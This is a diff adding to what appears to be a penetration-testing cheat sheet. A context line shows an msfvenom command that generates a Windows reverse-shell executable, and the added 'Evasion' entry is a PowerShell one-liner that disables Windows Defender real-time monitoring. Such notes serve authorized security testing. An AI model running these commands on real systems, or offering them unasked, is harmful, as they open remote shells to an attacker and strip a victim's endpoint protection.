@@ -1322,6 +1322,12 @@ $ msfvenom -p windows/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f exe -
 #10. - Evasion
 -----------------------------------------
 
+- Disable Windows Defender
+
+```
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true	
+```
+
 #11. - Online Resources
 -----------------------------------------
 
